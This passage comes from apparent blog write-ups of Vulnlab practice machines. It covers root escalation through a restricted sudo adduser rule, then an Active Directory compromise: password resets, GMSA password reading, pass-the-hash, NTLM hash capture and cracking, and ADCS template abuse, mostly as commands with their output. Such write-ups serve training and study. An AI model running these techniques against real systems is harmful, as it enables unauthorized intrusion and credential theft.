12:48 .cache</span><br><span class=\"line\">-r-------- 1 daz daz  200 Jun 21 12:48 .google_authenticator</span><br><span class=\"line\">-rw-r--r-- 1 daz daz  807 Jun 21 11:46 .profile</span><br><span class=\"line\">drwxrwxr-x 2 daz daz 4096 Jun 21 11:53 .ssh</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz 3088 Jul  3 19:08 backup.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>It seems that a similar <code>.google_authenticator</code> file was decompressed from the archive. If we read this file, we can see that there are a plethora of verification codes that are within this file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat .google_authenticator </span><br><span class=\"line\">CLSSSMHYGLENX5HAIFBQ6L35UM</span><br><span class=\"line\">&quot; RATE_LIMIT 3 30 1718988529</span><br><span class=\"line\">&quot; WINDOW_SIZE 3</span><br><span class=\"line\">&quot; DISALLOW_REUSE 57299617</span><br><span class=\"line\">&quot; TOTP_AUTH</span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Based on the <code>RATE_LIMIT</code>, my guess is that we can only use these backup verification codes three times every 30 minutes or they refresh every 30 minutes.</p>\n<p>If we attempt to log in as <code>useradmin</code> with their password and one of these verification codes (I used 99852083), we can see that the codes seem to work and we are able to login as <code>useradmin</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ su useradmin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">Verification code: </span><br><span class=\"line\">useradmin@manage:~/backups$</span><br></pre></td></tr></table></figure>\n\n<p>I made sure to execute my Sliver binary again so we aren’t required to use another token for a login attempt.</p>\n<h1 id=\"Privilege-Escalation-via-Admin-Group\"><a href=\"#Privilege-Escalation-via-Admin-Group\" class=\"headerlink\" title=\"Privilege Escalation via Admin Group\"></a>Privilege Escalation via Admin Group</h1><p>Upon getting access to <code>useradmin</code>, I immediately ran <code>sudo -l</code> to see if we had sudo access to any binaries on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomcat@manage:/home/useradmin/backups$ su useradmin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">Verification code: </span><br><span class=\"line\">useradmin@manage:~/backups$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for useradmin on manage:</span><br><span class=\"line\">    env_reset, timestamp_timeout=1440, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User useradmin may run the following commands on manage:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have sudo access to <code>/usr/sbin/adduser</code>, though you’ll notice that a string of text is following the command.</p>\n<p>I did some research into specifically what this meant, and it seems to be a string of characters followed by regular expression variables that limit the extent of the command.</p>\n<ul>\n<li><code>^</code> indicates that the start of a line.</li>\n<li><code>[a-zA-Z0-9]</code> indicates any set of alphanumeric characters.</li>\n<li><code>+</code> means that we can add an unlimited amount of characters, given that they fall under the prerequisites of the previous regex statement (alphanumeric).</li>\n<li><code>$</code> indicates the end of the line.</li>\n</ul>\n<p>This essentially means that we only have the ability to enter in a string for <code>adduser</code>, limiting what we essentially are able to do.</p>\n<p>The <code>/usr/sbin/adduser</code> binary seems to just be adding a user. The interesting part is that a <code>--system</code> function exists in that binary which seems to allow us to add a system privileged (root-level) user. The only issue is the regular expression privileges that I described earlier, which limit us from adding anything else besides an alphanumeric string as an argument in the command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz --system</span><br><span class=\"line\">[sudo] password for useradmin:                                                                                                </span><br><span class=\"line\">sudo: a password is required                                                                                                  </span><br><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz                </span><br><span class=\"line\">Adding user `daz&#x27; ...                        </span><br><span class=\"line\">Adding new group `daz&#x27; (1003) ...</span><br><span class=\"line\">Adding new user `daz&#x27; (1003) with group `daz&#x27; ...</span><br><span class=\"line\">Creating home directory `/home/daz&#x27; ...</span><br><span class=\"line\">Copying files from `/etc/skel&#x27; ...</span><br><span class=\"line\">New password: </span><br></pre></td></tr></table></figure>\n\n<p>If the binary ends up requiring us to enter in the <code>useradmin</code> password, this means that our string was not accepted and it WILL error out if you authenticate normally. We have <code>NOPASSWD</code> privileges for this binary, meaning it should work normally without a password if we use the command as intended.</p>\n<p>My first thought when doing this was to see if there were any ways to exploit how Linux interprets regular expressions with their commands. I was able to trigger regex when attempting to use bash-specific characters like <code>!</code> and <code>\\</code>:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser daz!a       </span><br><span class=\"line\">bash: !a: event not found</span><br></pre></td></tr></table></figure>\n\n<p>Though I wasn’t able to get anywhere with it. I did however, find a solution when considering a specific user we could add while staying in the bounds of what the <code>adduser</code> binary can actually do.</p>\n<p>If you try to add a user called <code>root</code>, it should produce an error that the <code>root</code> user already exists - because it does. However, if you look at the default <code>/etc/sudoers</code> <a href=\"https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\">file on Ubuntu machines</a>, you may find an interesting parameter that is there by default.</p>\n<p><img src=\"/images/vulnlab/manage-vl/e.png\"></p>\n<p>It seems that users within the <code>admin</code> group also have all sudo privileges, much like the root user. </p>\n<p>However if you’ll notice, there is no <code>admin</code> group within <code>/etc/group</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">......</span><br><span class=\"line\">landscape:x:117:</span><br><span class=\"line\">fwupd-refresh:x:118:</span><br><span class=\"line\">karl:x:1000:</span><br><span class=\"line\">tomcat:x:1001:</span><br><span class=\"line\">useradmin:x:1002:</span><br><span class=\"line\">daz:x:1003:</span><br></pre></td></tr></table></figure>\n\n<p>This means that if we create a user named <code>admin</code>, it should be granted SUDO rights on the machine based on the <code>sudoers</code> file. Since there isn’t a user&#x2F;group already created, it will interpret the user’s name as the group for it to add to. This is backed by the fact that our users are given a group of their same name if we run <code>cat /etc/group</code>, as listed above.</p>\n<p>So if we create a user called admin, it should trick the Linux OS into creating an <code>admin</code> group which will give all users (one of which being our newly created user) SUDO rights on the filesystem.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ sudo /usr/sbin/adduser admin</span><br><span class=\"line\">Adding user `admin&#x27; ...</span><br><span class=\"line\">Adding new group `admin&#x27; (1004) ...</span><br><span class=\"line\">Adding new user `admin&#x27; (1004) with group `admin&#x27; ...</span><br><span class=\"line\">Creating home directory `/home/admin&#x27; ...</span><br><span class=\"line\">Copying files from `/etc/skel&#x27; ...</span><br><span class=\"line\">New password: </span><br><span class=\"line\">Retype new password: </span><br><span class=\"line\">passwd: password updated successfully</span><br><span class=\"line\">Changing the user information for admin</span><br><span class=\"line\">Enter the new value, or press ENTER for the default</span><br><span class=\"line\">        Full Name []: </span><br><span class=\"line\">        Room Number []: </span><br><span class=\"line\">        Work Phone []: </span><br><span class=\"line\">        Home Phone []: </span><br><span class=\"line\">        Other []: </span><br><span class=\"line\">Is the information correct? [Y/n] Y</span><br></pre></td></tr></table></figure>\n\n<p>I gave the <code>admin</code> user the password <code>password</code>, and if we attempt to use <code>sudo su</code>:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">useradmin@manage:~/backups$ su admin</span><br><span class=\"line\">Password: </span><br><span class=\"line\">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class=\"line\">See &quot;man sudo_root&quot; for details.</span><br><span class=\"line\"></span><br><span class=\"line\">admin@manage:/home/useradmin/backups$ sudo su</span><br><span class=\"line\">[sudo] password for admin: </span><br><span class=\"line\">root@manage:/home/useradmin/backups# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to login as <code>root</code>. The root flag is within <code>/root/root.txt</code>, and this means we have successfully compromised this machine!</p>\n<p><img src=\"/images/vulnlab/manage-vl/f.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box really helped with problem-solving and understanding how to properly exploit something if you just consider exactly how it’s supposed to function. Don’t get wrapped up into a rabbit hole by overthinking what you can exploit - instead take some time to think about the overarching functionality that something can do while also staying within the boundaries of its limits.</p>\n<p>Great machine, big thanks again to fume and xct.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html\">https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html</a><br><a href=\"https://www.geeksforgeeks.org/remote-method-invocation-in-java/\">https://www.geeksforgeeks.org/remote-method-invocation-in-java/</a><br><a href=\"https://www.baeldung.com/java-management-extensions\">https://www.baeldung.com/java-management-extensions</a><br><a href=\"https://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed\">https://docs.oracle.com/javase%2Ftutorial%2F/jmx/mbeans/index.html#:~:text=An%20MBean%20is%20a%20managed,that%20needs%20to%20be%20managed</a>.<br><a href=\"https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e\">https://gist.github.com/alitoufighi/679304d9585304075ba1ad93f80cce0e</a><br><a href=\"https://kodekloud.com/blog/how-to-list-all-groups-in-linux/\">https://kodekloud.com/blog/how-to-list-all-groups-in-linux/</a></p>\n"},{"title":"Sendai - Vulnlab","date":"2024-07-07T05:45:13.000Z","keywords":"Vulnlab, Medium, Windows","description":"Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.","cover":"/images/vulnlab/sendai-vl/sendai_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nSendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.\n\n# Enumeration\n\nLet's first start out with our NMAP scan of the machine.\n\n```\n└─$ sudo nmap 10.10.98.227 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 10:53 EDT\nNmap scan report for sendai.vl (10.10.98.227)\nHost is up (0.11s latency).\nNot shown: 986 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n443/tcp  open  https\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 7.27 seconds\n```\n\nWe see a couple ports open such as SMB and LDAP, along with an HTTP server running on port 80.\n\nThe HTTP server seems to be a bare IIS website, meaning there isn't a direct service that we can exploit at this moment.\n\n![](/images/vulnlab/sendai-vl/b.png)\n\nI ran a `gobuster` scan against the web service for about a minute to see if there were any directories we could find, though came back with no results that we can access right now.\n\n```\n└─$ gobuster dir -u http://10.10.98.227 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.98.227\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/service              (Status: 301) [Size: 151] [--> http://10.10.98.227/service/]\n```\n\nA `/service` directory does come back valid, though it does not seem that we currently have access to the page (403 Access Denied). I've seen directories like this in my time doing [Lustrous](https://dan-feliciano.com/2024/06/05/lustrous/), which involved using Kerberos authentication to access websites that we previously did not have access to. Since there seems to be no other way to authenticate with user input, I'll make the guess that this will be part of the attack path later down the line.\n\n# Resetting Expired Passwords\n\nLet's take a look at SMB to see if there are any shares that we can access.\n\n```\n└─$ smbclient -L 10.10.98.227 -N        \n\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nconfig          Disk      \nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nsendai          Disk      company share\nSYSVOL          Disk      Logon server share \nUsers           Disk\n```\n\nWe seem to have access to a few shares, and the SMB login allows null authentication.\n\nIf you do some enumeration into these shares, you'll notice that we only have access to `sendai` and `Users`. The `Users` share just contains the directories of the `Default` and `Public` directories, meaning this specific share is only hosting those User folders within `C:\\Users` on the remote computer. The `sendai` share however contains a multitude of folders, specifically containing an interesting file at its root folder.\n\n```\nsmb: \\> ls\n  .                                   D        0  Tue Jul 18 13:31:04 2023\n  ..                                DHS        0  Wed Jul 19 10:11:25 2023\n  hr                                  D        0  Tue Jul 11 08:58:19 2023\n  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023\n  it                                  D        0  Tue Jul 18 09:16:46 2023\n  legal                               D        0  Tue Jul 11 08:58:23 2023\n  security                            D        0  Tue Jul 18 09:17:35 2023\n  transfer                            D        0  Tue Jul 11 09:00:20 2023\n\n7309822 blocks of size 4096. 604434 blocks available\nsmb: \\> get incident.txt\ngetting file \\incident.txt of size 1372 as incident.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)\n```\n\n![](/images/vulnlab/sendai-vl/c.png)\n\nIt seems as though there is a notice about poor password management/usage within the environment, specifically from the domain users. Aside from this, the note also tells us that all users that have had their passwords reset have been expired as of where we are now.\n\nGiven that a few users may have their passwords reset, we can test whether or not any of them have a null password (indicating a user with an expired password). However - we'll need a user list in order to do so. Luckily enough - since we have null authentication to SMB, we can essentially enumerate all of the domain users using a tool such as `lookupsid`. This will brute force all of the domain SIDs of all objects within the domain that have a max RID value below 4000(we can increase this RID value, though its not needed for this machine).\n\n```\nimpacket-lookupsid sendai.vl/'temp'@10.10.98.227 -no-pass -domain-sids | cut -d '\\' -f 2 | awk 'NR >= 31 {print $1}' > full_ul.txt\n```\n\nI've done the needful and converted all of the domain users into a wordlist. Let's now test for any users that have an expired password.\n\n```\n└─$ crackmapexec smb 10.10.98.227 -u full_ul.txt -p '' --continue-on-success\n[-] sendai.vl\\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE\n[-] sendai.vl\\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE\n```\n\nYou'll receive a few false positives from users such as `admsvc` or `staff`, and this is due to the fact that these aren't legitimate domain users. Since they aren't domain users, SMB falls back on its null authentication for these usernames - meaning they would work regardless.\n\nAs noted from the code snippet above, it seems as though `Elliot.Yates` and `Thomas.Powell` both have their passwords reset.\n\nWe can reset these passwords using Impacket's built-in `smbpasswd` tool, which will reset the passwords of the users we give it.\n\n```\n└─$ impacket-smbpasswd sendai.vl/'Elliot.Yates'@10.10.98.227 -newpass 'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n===============================================================================\n  Warning: This functionality will be deprecated in the next Impacket version  \n===============================================================================\n\nCurrent SMB password: \n[!] Password is expired, trying to bind with a null session.\n[*] Password was changed successfully.\n```\n\nWe can then test the users authentication to LDAP using `crackmapexec`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@'              \nSMB         10.10.98.227   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227   389    DC               [+] sendai.vl\\Elliot.Yates:Password123@\n```\n\nNow that we have a valid user in LDAP, let's dump the domain using Bloodhound along with its [Python ingestor](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'sendai.vl' -u 'Elliot.Yates' -p 'Password123@' -c all -ns 10.10.98.227 --zip\n```\n\n# MGTSVC Method #1 - LDAP\n\nAt this point, there are two methods that you can use to get user. The intended path is to go through LDAP in order to escalate privileges, however there is also a web-focused path that I will cover after the intended.\n\nIf you take a look over at Bloodhound, you'll notice that our user `Elliot.Yates` has an interesting outbound object control.\n\n![](/images/vulnlab/sendai-vl/d.png)\n\nIt seems that we are apart of the `Support` domain group. Due to us being within the `Support` domain group, we are automatically given the right to have `GenericAll` over the `admsvc` domain group. I've had this privilege before, however it's mainly been on either domain user or domain computers. The difference here is that this privilege is against a group - though it can also allow us to add our current user to that group.\n\nWe can do so by using the default RPC package that comes built-in with Kali. This tool, `net rpc`, can allow us to modify the domain group and add ourselves to it.\n\n```\n└─$ net rpc group addmem \"admsvc\" \"Elliot.Yates\" -U sendai.vl/\"Elliot.Yates\"%\"Password123@\" -S dc.sendai.vl\n```\n\nWe can then verify that the change has been made with the same tool.\n\n```\n└─$ net rpc group members \"admsvc\" -U \"sendai.vl\"/\"Elliot.Yates\"%\"Password123@\" -S dc.sendai.vl\nSENDAI\\websvc\nSENDAI\\Norman.Baxter\nSENDAI\\Elliot.Yates\n```\n\nAs you can see, we were added to the group successfully. Looking into these group members domain privileges, we can see that users within this group has a specific outbound object control as well.\n\n![](/images/vulnlab/sendai-vl/e.png)\n\nUsers within the `admsvc` group have the `ReadGMSAPassword` over the `MGTSVC$` account. This privilege allows us to view the Group-Managed Service Account (GMSA) password of the support account, which will return to us the NT hash of the account.\n\nCrackmapexec has a handle for this, so we can easily do it with `Elliot.Yates` credentials.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@' --gmsa           \nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    636    DC               [+] sendai.vl\\Elliot.Yates:Password123@ \nLDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords\nLDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece1a9[...snip...]a44c1a20\n```\n\nI verified that the `MGTSVC$` account has WinRM access through Bloodhound, as you can see that it is a part of the `Remote Management Users` group.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'mgtsvc$' -H '52ece[...snip...]4c1a20'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents> whoami\nsendai\\mgtsvc$\n```\n\nThis means we have successfully completed the first half of the machine. The first user flag is within `C:\\`.\n\n# MGTSVC Method #2 - WebSVC\n\nThis second method I discovered, credit goes out to Yeeb for this specific attack path.\n\nIf we run a `gobuster` scan against the HTTP service, you'll notice that an interesting endpoint that we can't see on the main HTTP page of the domain.\n\n```\n└─$ gobuster vhost --url https://sendai.vl -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k --exclude-length 334 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:              https://sendai.vl\n[+] Method:           GET\n[+] Threads:          50\n[+] Wordlist:         /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:       gobuster/3.6\n[+] Timeout:          10s\n[+] Append Domain:    true\n[+] Exclude Length:   334\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: service.sendai.vl Status: 200 [Size: 4189]\n```\n\nBrowsing to this subdomain (after editing it into our `/etc/hosts` file) will lead us to the DownDetector.\n\n![](/images/vulnlab/sendai-vl/f.png)\n\nThis website seems to be an internal website scan, which will verify if a subdomain within the environment is experiencing issues. It seems as though this requires no authentication, however its usability can be severe.\n\nIt allows us to prompt a subdomain to check, meaning this website will probably submit an LDAP request to the subdomain that we specify. What's great is that we actually have the ability to create a fake subdomain due to `Elliot.Yates` Machine Account Quota (MAQ). This let's us create a computer account, to which we can use to create an LDAP record of a fake subdomain that points back to our attacker machine. If there is a service account associated with this web service, we can capture their NetNTLMv2 hash using `responder`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'Elliot.Yates' -p 'Password123@' -M maq\nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    389    DC               [+] sendai.vl\\Elliot.Yates:Password123@ \nMAQ         10.10.98.227    389    DC               [*] Getting the MachineAccountQuota\nMAQ         10.10.98.227    389    DC               MachineAccountQuota: 10\n```\n\nIt isn't necessarily needed for us to create a computer account for this attack, as all we need to do is create the fake LDAP record. It is odd though how we have a MAQ of 10, and given that this is what I'm used to doing - I decided to set up a domain computer account anyways.\n\nLet's first start with creating the domain computer.\n\n```\n└─$ impacket-addcomputer -dc-ip 10.10.98.227 -computer-name daz -computer-pass 'Password123@' sendai.vl/Elliot.Yates:'Password123@'\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Successfully added machine account daz$ with password Password123@.\n```\n\nWe can then use `dnstool.py` in the [KrbRelayX](https://github.com/dirkjanm/krbrelayx) library to create the fake LDAP record, using our new computer account credentials.\n\n```\n└─$ python3 krbrelayx/dnstool.py -u 'sendai.vl\\daz$' -p 'Password123@' -r daz.sendai.vl -d 10.8.0.173 --action add dc.sendai.vl -dns-ip 10.10.98.227\n[-] Connecting to host...\n[-] Binding to host\n[+] Bind OK\n[-] Adding new record\n[+] LDAP operation completed successfully\n```\n\nYou'll need to wait a few minutes for the LDAP record to update into the environment, it took around 5 minutes for me. We'll boot up `responder` to wait for incoming LDAP requests to our attacker machine.\n\n```\n└─$ sudo responder -I tun0      \n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n```\n\nAfter we've waited long enough, we should be able to submit a request to our controlled subdomain into DownDetector. You may receive an error, however if we look back at `responder` you'll see that an NTLM hash was captured.\n\n```\n[+] Listening for events...                                                                                                   \n\n[HTTP] NTLMv2 Client   : 10.10.98.227\n[HTTP] NTLMv2 Username : SENDAI\\websvc\n[HTTP] NTLMv2 Hash     : websvc::SENDAI:7ddba3792facbeff:2B[...snip...]00000000000000\n```\n\nWe can crack this hash using `hashcat`, to which we'll be using a hash identifier value of 5600.\n\n```\n└─$ hashcat -a 0 -m 5600 websvc.txt /usr/share/wordlists/rockyou.txt\n......\n2366e65c8e9a29435777b0a001000000000000000000000000000000000000900240048005400540050002f00640061007a002e00730065006e006400610069002e0076006c000000000000000000:[...snip...]\n   \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nAs you can see, we were successfully able to crack the hash for `websvc`. Looking back at Bloodhound, we can see that this user is within the `admsvc` group along with the `Elliot.Yates` user that we added to in Method #1.\n\n![](/images/vulnlab/sendai-vl/g.png)\n\nThis means we can also use `crackmapexec` along with `websvc` creds to read the GMSA password and get the NT hash for `mgtsvc$`.\n\n```\n└─$ crackmapexec ldap 10.10.98.227 -u 'websvc' -p '(WEBSVC PASSWORD)' --gmsa          \nSMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.98.227    636    DC               [+] sendai.vl\\websvc:[...snip...] \nLDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords\nLDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece[...snip...]4c1a20\n```\n\nWe can then use the `mgtsvc$` NT hash to authenticate to WinRM using PTH.\n\n```\n└─$ evil-winrm --ip 10.10.98.227 -u 'mgtsvc$' -H '52ece[...snip...]4c1a20'\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents> whoami\nsendai\\mgtsvc$\n```\n\n# PrivEsc Method #1 - PrivEscCheck\n\nIf you may have noticed before, ADCS is running on the machine. This can be assumed due to the `ca-operators` domain group within the environment, and also due to the fact that port 9389 is running (this isn't conclusive, but generally I've seen this port open with machines running ADCS).\n\nThe only issue is that we do not currently possess the capabilities to retrieve vulnerable ADCS templates, as we do not control a user account within the `ca-operators` group.\n\n![](/images/vulnlab/sendai-vl/h.png)\n\nWe'll need to take control of either `Anthony.Smith` or `Clifford.Davey` in order to exploit ADCS. If you scan for vulnerable ADCS templates using any of the domain accounts we have access to, you won't find any vulnerable templates (at least to what I could see).\n\nGiven that we have access to the filesystem at this point, my assumption is that we'll need to do a bit of credential hunting.\n\nMy normal attack methodology would be to look through odd files or potentially cached DPAPI credentials with tools like [Seatbelt](https://github.com/GhostPack/Seatbelt), however I discovered an odd service that was running on the machine when I ran a scan with `ps`.\n\n```\nsliver (sendai) > ps\n\n Pid    Ppid   Owner            Arch     Executable                                  Session \n====== ====== ================ ======== =========================================== =========\n......\n2584   628                              helpdesk.exe                                -1\n```\n\nThis executable doesn't seem to be ran naturally, at least in the AD environments that I've tested in the past. We can receive if any usernames or passwords were passed into this executable in memory (during the time of its execution) by using tools such as [PrivEscCheck](https://github.com/itm4n/PrivescCheck).\n\n```\n*Evil-WinRM* PS C:\\temp> Import-Module .\\PrivescCheck.ps1\n*Evil-WinRM* PS C:\\temp> Invoke-PrivescCheck\n......\nName        : Support\nDisplayName :\nImagePath   : C:\\WINDOWS\\helpdesk.exe -u clifford.davey -p [...snip...] -k netsvcs\nUser        : LocalSystem\nStartMode   : Automatic\n```\n\nAs you can see, the `helpdesk.exe` had the credentials for `Clifford.Davey` passed into them at runtime. \n\n# PrivEsc Method #1 (cont.) - ADCS\n\nWe should now have the password for this user, meaning we can properly exploit [ADCS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation). We'll use `certipy-ad` for this, though you could also exploit this locally on the machine using [Certify](https://github.com/GhostPack/Certify) alongside [Rubeus](https://github.com/GhostPack/Rubeus). The only issue with the Windows solution is that you would need to drop Certify to the filesystem which can take a bit longer.\n\nSince we have access to the domain users credentials, we'll just use `certipy-ad`, which should be built-in to Kali (in case you don't have it, check [here](https://github.com/ly4k/Certipy)). We'll start by enumerating the ADCS templates.\n\n```\n└─$ certipy-ad find -vulnerable -dc-ip 10.10.98.227 -u 'clifford.davey'@sendai.vl -p '(CLIFFORD.DAVEY PASSWORD)'\n......\n[*] Saved text output to '20240707011831_Certipy.txt'\n[*] Saved JSON output to '20240707011831_Certipy.json'\n```\n\nIf you'll notice, this should save two text files (alongside Bloodhound data) to our local system. Looking into this file gives us the indication of a potential exploit.\n\n```\nCertificate Templates\n  0\n    Template Name                       : SendaiComputer\n    Display Name                        : SendaiComputer\n    Certificate Authorities             : sendai-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n......\n[!] Vulnerabilities\nESC4                              : 'SENDAI.VL\\\\ca-operators' has dangerous permissions\n```\n\nESC4 is a vulnerability that gives us the potential to alter a template and create an exploitable misconfiguration on a section of the template. As proclaimed in the HackTricks article that I posted above, we are able to modify the template's following permissions:\n\n- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.\n- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.\n- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.\n- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.\n- **WriteProperty:** Authorizes the editing of any object properties.\n\nTo keep things at a low-level, we can essentially modify the ESC4 template to become vulnerable to ESC1. We can then exploit the ESC1 vulnerability and gain a service ticket as the Administrator user.\n\nWe'll first start by converting said template to be vulnerable to ESC4.\n\n```\n└─$ certipy-ad template -username 'clifford.davey'@sendai.vl -password '(CLIFFORD.DAVEY PASSWORD)' -template SendaiComputer -save-old\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Saved old configuration for 'SendaiComputer' to 'SendaiComputer.json'\n[*] Updating certificate template 'SendaiComputer'\n[*] Successfully updated 'SendaiComputer'\n```\n\nNow that the template is vulnerable to ESC1, we can request for a keyfile for the Administrator user.\n\n```\n└─$ certipy-ad req -username 'clifford.davey'@sendai.vl -password '(CLIFFORD.DAVEY PASSWORD)' -template SendaiComputer -ca sendai-DC-CA -target dc.sendai.vl -upn administrator@sendai.vl\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 5\n[*] Got certificate with UPN 'administrator@sendai.vl'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n```\n\n`certipy-ad` will generate a keyfile for us that we can use to obtain a service ticket for this user. We'll use the `auth` tool for this.\n\n```\n└─$ certipy-ad auth -pfx administrator.pfx -username 'Administrator' -domain 'sendai.vl' -dc-ip 10.10.98.227\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@sendai.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to 